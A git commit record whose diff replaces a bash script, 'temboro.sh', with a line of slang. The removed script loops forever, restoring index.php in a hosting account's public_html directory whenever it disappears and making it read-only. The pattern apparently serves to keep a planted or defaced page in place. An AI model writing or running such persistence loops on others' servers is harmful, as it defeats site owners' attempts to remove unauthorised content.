0a7de1063b3ab20659e730bf2510e0a34de8879b
dorzkim <63092001+dorzkim@users.noreply.github.com>
2024-09-18 21:51:48 +0700

    Update temboro.sh

--- temboro.sh
+++ temboro.sh
@@ -1,16 +1,1 @@
-#!/bin/bash
-file="index.php"
-lok="/home/u1008463/public_html/"
-
-while true
-do
-    if [ -f $lok$file ]; then
-        chmod 444 $lok$file
-        echo "ada"
-    else
-        cp $file $lok$file
-        chmod 444 $lok$file
-        echo "ilang"
-    fi
-    sleep 5 # 5s = 5 second
-done
+atta kan ??????/// kwowkwokkow
